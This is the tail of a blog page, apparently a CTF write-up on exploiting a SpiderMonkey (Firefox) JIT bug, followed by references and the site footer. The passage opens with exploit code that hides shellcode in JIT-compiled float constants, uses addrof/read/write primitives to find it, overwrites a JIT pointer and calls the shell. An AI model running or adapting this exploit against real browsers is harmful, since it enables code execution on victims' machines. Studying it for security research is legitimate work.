</span></span><span class="line"><span class="cl">    <span class="nx">SC5</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034422697</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC6</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034440643</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC7</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034390964</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC8</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527042770368</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC9</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034447392</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl">    <span class="nx">SC10</span> <span class="o">=</span> <span class="o">-</span><span class="mf">6.828527034370483</span><span class="nx">e</span><span class="o">-</span><span class="mi">229</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Execute sc 0x1000 to make it got JITed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">sc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Get the function address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">sc_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">sc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Inspecting via gdb, we found that sc_addr + 0x28 contains pointer to JIT area
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">jit_info</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">sc_addr</span><span class="p">,</span> <span class="mh">0x28</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">jit_addr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">jit_info</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">code_addr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">jit_addr</span><span class="p">)</span> <span class="c1">// Now we have the address of the JIT area
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Brute force per byte until we found our magic string (0x41414141)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">200</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">132777</span><span class="nx">n</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">print</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">sc_start</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">code_addr</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">check</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">check</span> <span class="o">==</span> <span class="mf">5.40900888</span><span class="nx">e</span><span class="o">-</span><span class="mi">315</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">print</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Our real payload start 8 bytes after it
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">sc_start</span> <span class="o">=</span> <span class="nx">doubleAddBigInt</span><span class="p">(</span><span class="nx">sc_start</span><span class="p">,</span> <span class="mh">0x8</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Overwrite the jit address pointer of our sc func to point to our hidden shellcode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">write</span><span class="p">(</span><span class="nx">jit_addr</span><span class="p">,</span> <span class="nx">sc_start</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Call our shell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">sc</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
<h1 id="references">References</h1>
<ul>
<li><a href="https://github.com/m1ghtym0/browser-pwn" target="_blank" rel="noopener noreffer ">https://github.com/m1ghtym0/browser-pwn</a></li>
<li><a href="https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation" target="_blank" rel="noopener noreffer ">https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation</a></li>
<li><a href="https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery" target="_blank" rel="noopener noreffer ">https://doar-e.github.io/blog/2019/06/17/a-journey-into-ionmonkey-root-causing-cve-2019-9810/#the-nursery</a></li>
<li><a href="https://org.anize.rs/corCTF-2021/pwn/outfoxed" target="_blank" rel="noopener noreffer ">https://org.anize.rs/corCTF-2021/pwn/outfoxed</a></li>
<li><a href="https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/" target="_blank" rel="noopener noreffer ">https://webcache.googleusercontent.com/search?q=cache:ySfo3rNPA2kJ:https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/</a></li>
<li><a href="https://ctftime.org/writeup/29915" target="_blank" rel="noopener noreffer ">https://ctftime.org/writeup/29915</a></li>
<li><a href="https://ret2.life/posts/corCTF-2021/#fn:2" target="_blank" rel="noopener noreffer ">https://ret2.life/posts/corCTF-2021/#fn:2</a></li>
<li><a href="https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" target="_blank" rel="noopener noreffer ">https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/</a></li>
<li><a href="https://vigneshsrao.github.io/posts/play-with-spidermonkey/" target="_blank" rel="noopener noreffer ">https://vigneshsrao.github.io/posts/play-with-spidermonkey/</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/typhooncon-ctf-2022/" data-title="TyphoonCon CTF 2022" data-via="Chovid99" data-hashtags="Writeup,TyphoonCon,pwn,heap,firefox,SpiderMonkey,JIT,browser,oob,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/typhooncon-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/typhooncon/">TyphoonCon</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/firefox/">Firefox</a>,&nbsp;<a href="/tags/spidermonkey/">SpiderMonkey</a>,&nbsp;<a href="/tags/jit/">JIT</a>,&nbsp;<a href="/tags/browser/">Browser</a>,&nbsp;<a href="/tags/oob/">Oob</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/justctf-2022/" class="prev" rel="prev" title="JustCTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>JustCTF 2022</a>
            <a href="/posts/google-ctf-2022/" class="next" rel="next" title="Google CTF 2022">Google CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
